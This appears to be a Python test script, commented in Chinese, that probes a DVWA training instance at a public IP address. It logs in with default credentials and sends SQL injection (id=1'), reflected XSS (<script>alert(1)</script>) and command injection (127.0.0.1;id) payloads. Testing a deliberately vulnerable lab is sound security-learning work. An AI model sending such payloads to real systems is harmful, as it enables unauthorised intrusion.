"""直接用 requests 测试 DVWA"""
import sys
sys.stdout.reconfigure(encoding='utf-8')

import requests

DVWA = "http://47.95.192.41:8081"

# 使用 session 保持 cookie
s = requests.Session()

# 1. 访问首页
print("[1] 访问首页...")
r = s.get(f"{DVWA}/", allow_redirects=True)
print(f"    URL: {r.url}")
print(f"    Cookie: {dict(s.cookies)}")

# 2. 初始化数据库
print("\n[2] 初始化数据库...")
r = s.get(f"{DVWA}/setup.php")
r = s.post(f"{DVWA}/setup.php", data={"create_db": "Create / Reset Database"})
print(f"    结果: {'OK' if 'created' in r.text.lower() or 'exists' in r.text.lower() else 'CHECK'}")

# 3. 登录
print("\n[3] 登录...")
r = s.get(f"{DVWA}/login.php")
r = s.post(
    f"{DVWA}/login.php",
    data={"username": "admin", "password": "password", "Login": "Login"},
    allow_redirects=True
)
print(f"    URL: {r.url}")
print(f"    Cookie: {dict(s.cookies)}")

# 检查是否登录成功
if "index" in r.url or "Welcome" in r.text or "Vulnerability" in r.text:
    print("    [OK] 登录成功")
else:
    print("    [WARN] 可能未登录")

# 4. 测试 SQLi
print("\n[4] 测试 SQLi...")
r = s.get(f"{DVWA}/vulnerabilities/sqli/", params={"id": "1", "Submit": "Submit"})
print(f"    URL: {r.url}")
print(f"    标题: {'SQLi' if 'SQL' in r.text or 'sqli' in r.url else 'NOT SQLi PAGE'}")

if "First name" in r.text:
    print("    [OK] 漏洞页面可访问")
    import re
    names = re.findall(r'First name: ([^<]+)', r.text)
    print(f"    结果: {names}")
    
    # 注入测试
    r2 = s.get(f"{DVWA}/vulnerabilities/sqli/", params={"id": "1'", "Submit": "Submit"})
    if "error" in r2.text.lower() or "syntax" in r2.text.lower():
        print("    [!] SQLi Error-based 检测成功")
else:
    print(f"    内容片段: {r.text[:300].replace(chr(10), ' ')}")

# 5. 测试 XSS
print("\n[5] 测试 XSS...")
r = s.get(f"{DVWA}/vulnerabilities/xss_r/", params={"name": "test123"})
print(f"    URL: {r.url}")

if "test123" in r.text:
    print("    [OK] XSS 页面可访问")
    r2 = s.get(f"{DVWA}/vulnerabilities/xss_r/", params={"name": "<script>alert(1)</script>"})
    if "<script>alert(1)</script>" in r2.text:
        print("    [!] XSS 反射成功")

# 6. 测试 CMDi
print("\n[6] 测试 CMDi...")
r = s.get(f"{DVWA}/vulnerabilities/exec/", params={"ip": "127.0.0.1"})
print(f"    URL: {r.url}")

if "PING" in r.text or "ping" in r.text:
    print("    [OK] CMDi 页面可访问")
    r2 = s.get(f"{DVWA}/vulnerabilities/exec/", params={"ip": "127.0.0.1;id"})
    if "uid=" in r2.text:
        print("    [!] CMDi 注入成功")

print("\n[DONE]")
